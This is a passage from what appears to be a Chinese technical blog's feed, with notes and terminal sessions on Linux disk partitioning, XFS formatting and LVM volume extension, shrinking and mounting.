0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mkpart primary xfs 0 100%</span><br>Warning: The resulting partition is not properly aligned <span class="hljs-keyword">for</span> best performance: 34s % 2048s != 0s<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo mkfs.xfs  -f /dev/sdb1</span><br>warning: device is not properly aligned /dev/sdb1<br>meta-data=/dev/sdb1              isize=512    agcount=32, agsize=244171712 blks<br>         =                       sectsz=512   attr=2, projid32bit=1<br>         =                       crc=1        finobt=1, sparse=1, rmapbt=0<br>         =                       reflink=1<br>data     =                       bsize=4096   blocks=7813494784, imaxpct=5<br>         =                       sunit=64     swidth=256 blks<br>naming   =version 2              bsize=4096   ascii-ci=0, ftype=1<br><span class="hljs-built_in">log</span>      =internal <span class="hljs-built_in">log</span>           bsize=4096   blocks=521728, version=2<br>         =                       sectsz=512   sunit=64 blks, lazy-count=1<br>realtime =none                   extsz=4096   blocks=0, rtextents=0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 892.3G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  ├─rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>└─sdb1                          8:17   0  29.1T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="需求4："><a href="#需求4：" class="headerlink" title="需求4："></a>需求4：</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829091751.png" alt="image.png"></p><p>datavg-lv_data 从500G改为100G</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/lijiaman/p/12885649.html">Linux 物理卷(PV)、逻辑卷(LV)、卷组(VG)管理</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202212)磁盘管理</title>
    <link href="/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    <url>/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看磁盘使用率<br><span class="hljs-built_in">df</span> -h<br>查看单个目录的挂载情况(目录属于哪个分区)<br><span class="hljs-built_in">df</span> -h /home<br><br>fdisk -l<br>lsblk<br><span class="hljs-comment"># 查看文件系统类型</span><br>lsblk -f <br><br>lvremove<br>vgremove<br>pvremove<br><br><span class="hljs-comment"># fdisk /dev/sdb</span><br>:d  <span class="hljs-comment"># 删除</span><br>:w  <span class="hljs-comment"># 保存</span><br>dos分区表 一个分区最大2T<br>gpt分区表 不限制<br><br>查看是不是ssd<br><span class="hljs-comment"># 使用lsblk命令进行判断，参数-d表示仅显示设备本身（不显示其上分区），参数-o表示仅显示特定的列。</span><br><span class="hljs-comment"># # 0是ssd 1是hdd</span><br><span class="hljs-comment"># lsblk -d -o name,rota   </span><br><span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># lvremove /dev/mapper/vgqjc-lvqjc </span><br>Do you really want to remove active logical volume vgqjc/lvqjc? [y/n]: y<br>  Logical volume <span class="hljs-string">&quot;lvqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># vgremove /dev/mapper/vgqjc</span><br>  Volume group <span class="hljs-string">&quot;vgqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># pvremove /dev/sdl</span><br>  Labels on physical volume <span class="hljs-string">&quot;/dev/sdl&quot;</span> successfully wiped.<br>[root@localhost ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># lsblk -d -o name,rota</span><br>NAME ROTA<br>sda     1<br>sdb     1<br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment">#</span><br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br>/sys/block/dm-0/queue/rotational:1<br>/sys/block/dm-1/queue/rotational:1<br>/sys/block/sda/queue/rotational:1<br>/sys/block/sdb/queue/rotational:1<br><br></code></pre></td></tr></table></figure><p><code>fdisk</code>命令中device通常是<code>/dev/hda</code>、<code>/dev/hdb</code>….(IDE接口类型的硬盘设备名)或<code>/dev/sda</code>、<code>/dev/sdb</code>….(SCSI接口类型硬盘设备名)，表示整个硬盘，如果硬盘被分区，则在设备名后追加一个数字表示此设备的第几个分区。如上例中的<code>/dev/sda1</code>和<code>/dev/sda2</code></p><p>疑问：<br>1.IDE接口类型的硬盘和SCSI接口类型硬盘有什么区别？<br>2.&#x2F;etc&#x2F;mtab和&#x2F;etc&#x2F;fstab的区别？</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">lvdisplay<br>pvdisplay<br>vgdisplay<br><br>可以使用pvdisplay 或者p<span class="hljs-attr">vscan查看创建的物理卷  </span><br><span class="hljs-attr">使用vgdisplay 或者vgscan 查看卷组  </span><br><span class="hljs-attr">使用lvscan 或者lvdisplay查看[逻辑卷](https://so.csdn.net/so/search?q=%E9</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BB<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span><span class="hljs-number">91</span><span class="hljs-meta">%</span>E<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>D<span class="hljs-meta">%</span>B<span class="hljs-number">7</span>&amp;spm=<span class="hljs-number">1001.2101</span><span class="hljs-number">.3001</span><span class="hljs-number">.7020</span>)  <br>使用df -h查看是否创建成功<br></code></pre></td></tr></table></figure><h2 id="需求1：扩容某一个文件系统目录"><a href="#需求1：扩容某一个文件系统目录" class="headerlink" title="需求1：扩容某一个文件系统目录"></a>需求1：扩容某一个文件系统目录</h2><h3 id="当前情况"><a href="#当前情况" class="headerlink" title="当前情况"></a>当前情况</h3><p>当前磁盘情况</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155257.png" alt="image.png"></p><p>查看你文件系统类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk -f<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155421.png" alt="image.png"></p><p>当前pv，vg，lv情况：<br>当前sdb下有sdb1分区<br>基于&#x2F;dev&#x2F;sdb1创建了pv </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pvcreate  /dev/sdb1 --force<br></code></pre></td></tr></table></figure><p>基于pv创建了vg(datavg为vg的名字)                 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vgcreate  datavg /dev/sdb1<br></code></pre></td></tr></table></figure><p>基于datavg创建了lv(lv_data_xxx_data为lv的名字)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lvcreate  -L 4T -n lv_data_xxx_data datavg<br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_data_xxx_data<br></code></pre></td></tr></table></figure><p>挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mount  /dev/mapper/datavg-lv_data_xxx_data /vdata/xxx/data<br></code></pre></td></tr></table></figure><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>想把sdc到sdm这些磁盘全部挂载到&#x2F;vdata&#x2F;tg-paas&#x2F;data下，该如何实现？</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo parted  -s /dev/sdc mklabel gpt<br>sudo parted  -s /dev/sdc mkpart primary xfs 0 100%<br>sudo mkfs.xfs  -f /dev/sdc1<br><br>sudo pvcreate  /dev/sdc1 --force<br><br>sudo vgextend datavg /dev/sdc1<br><br>lvresize -L +9.1T /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># 使用xfs_groupfs进行在线调整xfs格式的文件系统大小</span><br><span class="hljs-comment"># lsblk -f 查看文件系统类型</span><br>xfs_growfs /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># 查看已经扩容成功</span><br>lsblk<br><span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure><h2 id="给某个目录-x2F-var-x2F-www-x2F-html挂盘"><a href="#给某个目录-x2F-var-x2F-www-x2F-html挂盘" class="headerlink" title="给某个目录&#x2F;var&#x2F;www&#x2F;html挂盘"></a>给某个目录&#x2F;var&#x2F;www&#x2F;html挂盘</h2><h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk<br><span class="hljs-built_in">df</span> -h | <span class="hljs-built_in">head</span> -n 20<br><br><span class="hljs-built_in">mkdir</span> -p /var/www/html<br><br><br>lvdisplay | sudo grep  lv_pkg<br>sudo lvcreate  -L 200G -n lv_pkg datavg<br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br>sudo <span class="hljs-built_in">df</span> -h |grep html<br><span class="hljs-built_in">df</span> -h | grep var<br></code></pre></td></tr></table></figure><h3 id="解挂"><a href="#解挂" class="headerlink" title="解挂"></a>解挂</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br>/dev/mapper/datavg-lv_pkg              1.0T  7.2G 1017G   1% /var/www/html<br><span class="hljs-comment"># cd ~</span><br><span class="hljs-comment"># umount /dev/mapper/datavg-lv_pkg</span><br><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 444.6G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  ├─rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>└─sdb1                          8:17   0   4.9T  0 part <br>  ├─datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  ├─datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  ├─datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  ├─datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  └─datavg-lv_pkg             252:9    0     1T  0 lvm  <br><br><br><span class="hljs-comment"># lvresize -L 200G /dev/mapper/datavg-lv_pkg</span><br>  WARNING: Reducing active logical volume to 200.00 GiB.<br>  THIS MAY DESTROY YOUR DATA (filesystem etc.)<br>Do you really want to reduce datavg/lv_pkg? [y/n]: y<br>  Size of logical volume datavg/lv_pkg changed from 1.00 TiB (262144 extents) to 200.00 GiB (51200 extents).<br>  Logical volume datavg/lv_pkg successfully resized.<br><br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 444.6G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  ├─rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>└─sdb1                          8:17   0   4.9T  0 part <br>  ├─datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  ├─datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  ├─datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  ├─datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  └─datavg-lv_pkg             252:9    0   200G  0 lvm  <br><br><br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br><br>删除对应行<br><br><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br><br></code></pre></td></tr></table></figure><h2 id="需求3：sdb下面分了三个区，想要变成1个"><a href="#需求3：sdb下面分了三个区，想要变成1个" class="headerlink" title="需求3：sdb下面分了三个区，想要变成1个"></a>需求3：sdb下面分了三个区，想要变成1个</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 892.3G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  ├─rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>├─sdb1                          8:17   0   512M  0 part <br>├─sdb2                          8:18   0     1G  0 part <br>└─sdb3                          8:19   0   7.3T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># ls /dev/sdb1</span><br>/dev/sdb1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo ls -l /dev/mapper/ | sudo grep datavg</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mklabel gpt</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 892.3G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  ├─rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mkpart primary xfs 0 100%</span><br>Warning: The resulting partition is not properly aligned <span class="hljs-keyword">for</span> best performance: 34s % 2048s != 0s<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo mkfs.xfs  -f /dev/sdb1</span><br>warning: device is not properly aligned /dev/sdb1<br>meta-data=/dev/sdb1              isize=512    agcount=32, agsize=244171712 blks<br>         =                       sectsz=512   attr=2, projid32bit=1<br>         =                       crc=1        finobt=1, sparse=1, rmapbt=0<br>         =                       reflink=1<br>data     =                       bsize=4096   blocks=7813494784, imaxpct=5<br>         =                       sunit=64     swidth=256 blks<br>naming   =version 2              bsize=4096   ascii-ci=0, ftype=1<br><span class="hljs-built_in">log</span>      =internal <span class="hljs-built_in">log</span>           bsize=4096   blocks=521728, version=2<br>         =                       sectsz=512   sunit=64 blks, lazy-count=1<br>realtime =none                   extsz=4096   blocks=0, rtextents=0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>├─sda1                          8:1    0   512M  0 part /boot/efi<br>├─sda2                          8:2    0     1G  0 part /boot<br>└─sda3                          8:3    0 892.3G  0 part <br>  ├─rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  ├─rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  ├─rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  ├─rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  └─rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>└─sdb1                          8:17   0  29.1T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>&#96;&#96;&#96;</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/lijiaman/p/12885649.html">Linux 物理卷(PV)、逻辑卷(LV)、卷组(VG)管理</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202212) kube-state-metrics中kube_endpoint_address指标</title>
    <link href="/2022/12/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20kube-state-metrics%E4%B8%ADkube_endpoint_address%E6%8C%87%E6%A0%87/"/>
    <url>/2022/12/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20kube-state-metrics%E4%B8%ADkube_endpoint_address%E6%8C%87%E6%A0%87/</url>
    
